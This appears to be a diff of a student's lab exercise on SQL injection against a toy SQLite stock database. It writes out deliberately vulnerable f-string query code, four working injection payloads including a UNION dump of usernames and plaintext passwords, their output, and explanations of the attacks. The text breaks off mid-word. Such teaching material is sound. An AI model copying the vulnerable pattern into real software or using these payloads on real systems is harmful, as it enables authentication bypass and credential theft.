@@ -1,5 +1,5 @@
-#Name                ID        Date
-# Allen Nakalema .N  001       21/04/2026
+#Name                    Date
+# Allen Nakalema .N      21/04/2026
 
 # setup.py
 import sqlite3
@@ -182,3 +182,60 @@ Query G:
 
 screenshots/task2.png
 screenshots/task-2.png
+
+#TASK 3
+import sqlite3
+conn = sqlite3.connect('nyondo_stock.db')
+
+def search_product(name):
+    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
+    print(f'Query: {query}')
+    rows = conn.execute(query).fetchall()
+    print(f'Result: {rows}\n')
+    return rows
+
+def login(username, password):
+    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+    print(f'Query: {query}')
+    row = conn.execute(query).fetchone()
+    print(f'Result: {row}\n')
+    return row
+
+
+search_product("' OR 1=1--")  
+login("admin'--", "anything")  
+login("' OR '1'='1", "' OR '1'='1")   
+search_product("' UNION SELECT id, username, password, role FROM users--")       
+
+
+Query: SELECT * FROM products WHERE name LIKE '%' OR 1=1--%'
+Result: [(1, 'Cement (bag)', 'Portland cement 50kg bag', 38000.0), (2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (6, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (7, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (8, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (9, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (10, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (11, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (12, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (13, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (14, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (15, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (16, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (17, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (18, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (19, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (20, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)]
+
+Query: SELECT * FROM users WHERE username='admin'--' AND password='anything'
+Result: (1, 'admin', 'admin123', 'admin')
+
+Query: SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
+Result: (1, 'admin', 'admin123', 'admin')
+
+Query: SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, username, password, role FROM users--%'
+Result: [(1, 'Cement (bag)', 'Portland cement 50kg bag', 38000.0), (1, 'admin', 'admin123', 'admin'), (2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (2, 'fatuma', 'pass456', 'attendant'), (3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (3, 'wasswa', 'pass789', 'manager'), (4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (6, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (7, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (8, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (9, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (10, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (11, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (12, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (13, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (14, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (15, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (16, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (17, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (18, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (19, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (20, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)]
+
+All the attacks work because our functions were written using f-strings eg. query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
+and query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+So this means user input is inserted directly into SQL and whatever the user types becomes part of the query itself
+
+For the first attack: search_product("' OR 1=1--")
+when we inject the "' OR 1=1 --" in the code and then our actual query becomes (SELECT * FROM products WHERE name LIKE '%' OR 1=1--%') so (' OR 1=1 --) replaces the name and ' OR 1=1 is read as true always and -- comments out the rest of the query, %' is ignored so the database return all records.
+
+For the second attack: login("admin'--", "anything")
+when we inject ("admin'--", "anything") in the code our actual query becomes SELECT * FROM users WHERE username='admin'--' AND password='anything'
+so it reads admin as the valid username and -- comments out everything and the rest is ignored and anyone or the admin can login without inputing the password.
+
+For the third attack: login("' OR '1'='1", "' OR '1'='1")
+when we inject ("' OR '1'='1", "' OR '1'='1") in our code, our actual query becomes (SELECT * FROM users 
+WHERE username='' OR '1'='1' 
+AND password='' OR '1'='1')
+that always evaluate to true, making the WHERE clause always true and bypassing authentication.
+
+FOR
+
